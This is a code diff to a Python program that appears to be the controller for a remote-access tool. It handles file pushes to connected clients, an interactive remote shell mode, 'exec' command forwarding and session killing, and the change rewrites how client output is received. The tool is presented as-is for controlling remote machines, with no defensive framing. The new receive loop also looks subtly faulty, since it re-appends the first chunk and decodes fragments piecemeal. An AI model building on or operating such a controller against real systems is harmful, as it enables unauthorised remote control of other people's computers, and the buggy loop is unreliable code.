@@ -166,24 +166,31 @@ def file_transfer_put(conn, commands):       #push file to server
     f.close()
 
 def listen_for_data(conn, mode="print",encoding="b64"):
-    if DEBUG:
-        print_info("Waiting for data...")
-    data = ""
-    while not data.endswith('[END]'):
-        recv = conn.recv(128)
-        recv_decoded = recv.decode('utf-8')
-        data = data + recv_decoded
-            
+    try:
+        if DEBUG:
+            print_info("Waiting for data...")
+
+        recv_total = ""
+        recv_data = conn.recv(128).decode('utf-8')
         if encoding == "b64":
-            data = base64_decode(data)
-
-    if DEBUG:
-        print(f"DATA: {data}")
-
-    if mode != "print":
-        return data.rstrip("[END]")
-    else:
-        print(data.rstrip("[END]"))
+            recv_total = recv_total + base64_decode(recv_data)
+        else:
+            recv_total = recv_total + recv_data
+        while '[END]' not in recv_total:
+            print(f"Received: {recv_total}")              
+            if encoding == "b64":
+                recv_total = recv_total + base64_decode(recv_data)
+            else:
+                recv_total = recv_total + recv_data
+            recv_data = conn.recv(128).decode('utf-8')
+        if mode != "print":
+            return recv_total[:-5]
+        else:
+            print(recv_total[:-5])
+    except Exception as e:
+        print(exc_info())
+        print(e)
+        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def kill_session(conn, source):
     print_info("Killing {}".format(source))
@@ -464,7 +471,7 @@ def listen():
                     cmd = ""
                 elif cmd == "7":
                     get_working_dir(conn)
-                    print_info(CURRENT_WORKING_DIR)
+                    print(BLUE + "CWD: {}{}".format(CURRENT_WORKING_DIR,RSTCOLORS))
                     cmd = ""
                 elif cmd.lower() == "shell":
                     while cmd.lower() == "shell":
@@ -516,9 +523,8 @@ def listen():
                     data = ""
                     new_cmd = cmd.replace("exec ","")
                     send_data(conn, new_cmd)
-                    if VERBOSE:
-                        print_info("Waiting for data...")
-                    listen_for_data(conn)
+                    #print_info("Sent:\n"+command)
+                    listen_for_data(conn,'print')
                     data = ""
                     cmd = ""
                 else:
